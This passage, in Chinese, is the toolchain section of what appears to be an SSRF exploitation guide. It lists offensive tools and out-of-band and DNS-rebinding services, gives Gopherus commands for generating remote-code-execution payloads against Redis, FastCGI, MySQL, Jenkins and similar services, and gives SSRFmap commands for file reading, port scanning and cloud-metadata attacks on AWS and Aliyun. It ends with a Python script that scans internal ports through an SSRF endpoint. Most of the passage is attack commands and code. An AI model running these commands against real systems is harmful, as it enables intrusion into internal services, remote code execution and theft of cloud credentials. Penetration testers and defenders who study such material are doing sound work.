## 九、工具链

### 9.1 辅助工具
| 工具 | 用途 |
|------|------|
| Gopherus | 生成Gopher协议Payload（Redis/FastCGI/Memcached等）|
| SSRFmap | SSRF自动化扫描利用 |
| Burp Collaborator | DNS/HTTP外带接收 |
| Interactsh | 开源OOB外带平台 |
| DNSLog.cn | DNS外带平台 |
| Singularity | DNS重绑定攻击框架 |
| rbndr | DNS重绑定公共服务 |
| xip.io / nip.io | 通配DNS指向任意IP |
| ffuf/gobuster | 内网目录/端口fuzz |

### 9.2 Gopherus使用
```bash
# Redis RCE
python gopherus.py --exploit redis

# FastCGI RCE
python gopherus.py --exploit fastcgi

# MySQL
python gopherus.py --exploit mysql

# Zabbix
python gopherus.py --exploit zabbix

# Apache Tomcat
python gopherus.py --exploit tomcat

# Jenkins
python gopherus.py --exploit jenkins-clI

# SMTP发送邮件
python gopherus.py --exploit smtp

# Memcached
python gopherus.py --exploit memcache

# 生成的Gopher payload需要二次URL编码（某些环境需要）
```

### 9.3 SSRFmap使用
```bash
python ssrfmap.py -r request.txt -p url -m readfiles
python ssrfmap.py -r request.txt -p url -m portscan
python ssrfmap.py -r request.txt -p url -m redis
python ssrfmap.py -r request.txt -p url -m github_workers
python ssrfmap.py -r request.txt -p url -m zabbix
python ssrfmap.py -r request.txt -p url -m aliyun
python ssrfmap.py -r request.txt -p url -m aws
python ssrfmap.py -r request.txt -p url -m fastcgi
```

### 9.4 端口扫描脚本
```python
import requests
for port in [22,80,443,3306,6379,8080,9000,11211,27017]:
    try:
        r = requests.get(f"http://target.com/ssrf?url=http://127.0.0.1:{port}", timeout=3)
        print(f"Port {port}: {r.status_code} - {len(r.content)} bytes")
    except:
        print(f"Port {port}: closed/filtered")
```

